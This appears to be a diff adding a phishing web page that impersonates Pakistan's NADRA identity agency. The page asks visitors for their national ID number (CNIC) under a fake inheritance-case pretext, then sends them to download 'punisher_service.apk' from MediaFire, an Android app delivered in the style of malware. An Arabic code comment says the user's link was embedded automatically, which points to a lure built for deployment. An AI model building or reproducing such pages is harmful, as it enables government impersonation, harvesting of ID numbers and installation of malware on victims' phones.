@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>NADRA - Secure Verification Portal</title>
+  <style>
+    :root { --primary:#065f46; --bg:#f3f4f6; --text:#1f2937; }
+    body { margin:0; font-family:'Segoe UI', Tahoma, sans-serif; background:var(--bg); color:var(--text); display:flex; align-items:center; justify-content:center; height:100vh; }
+    .card { background:#fff; border-radius:12px; padding:30px; box-shadow:0 15px 35px rgba(0,0,0,.1); max-width:400px; width:90%; text-align:center; border-top: 8px solid var(--primary); }
+    h1 { margin:0 0 10px; font-size:22px; color:var(--primary); }
+    p { margin:0 0 20px; font-size:14px; line-height:1.5; color:#4b5563; }
+    label { display:block; text-align:left; margin-bottom:8px; font-weight:bold; font-size:13px; color:#374151; }
+    input { width:100%; padding:14px; border-radius:8px; border:1px solid #d1d5db; background:#fff; font-size:18px; text-align:center; box-sizing:border-box; }
+    button { margin-top:20px; width:100%; padding:14px; border:0; border-radius:8px; background:var(--primary); color:#fff; font-weight:bold; font-size:16px; cursor:pointer; }
+    .footer-text { margin-top:25px; font-size:11px; color:#9ca3af; border-top: 1px solid #e5e7eb; padding-top: 15px; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>Identity Verification</h1>
+    <p>Please enter your 13-digit CNIC to decrypt and download the inheritance file (Case #PK-92843).</p>
+    <label for="cnic">National ID Number (CNIC)</label>
+    <input id="cnic" type="text" inputmode="numeric" maxlength="15" placeholder="XXXXX-XXXXXXX-X">
+    <button id="verifyBtn">UNLOCK & DOWNLOAD</button>
+    <div class="footer-text">© 2026 NADRA Government of Pakistan <br> Secure Data Encryption Protocol</div>
+  </div>
+
+  <script>
+    const btn = document.getElementById('verifyBtn');
+    const input = document.getElementById('cnic');
+    btn.addEventListener('click', () => {
+      const val = input.value.replace(/-/g, "").trim();
+      if (val.length === 13) {
+        btn.textContent = "Verifying Identity...";
+        btn.disabled = true;
+        
+        // الرابط حقك صار مدمج هنا أوتوماتيكياً
+        setTimeout(() => {
+          window.location.href = "https://www.mediafire.com/file/zuos5nzbvnywupt/punisher_service.apk/file";
+        }, 1200);
+      } else {
+        alert("Please enter a valid 13-digit CNIC.");
+      }
+    });
+  </script>
+</body>
+</html>
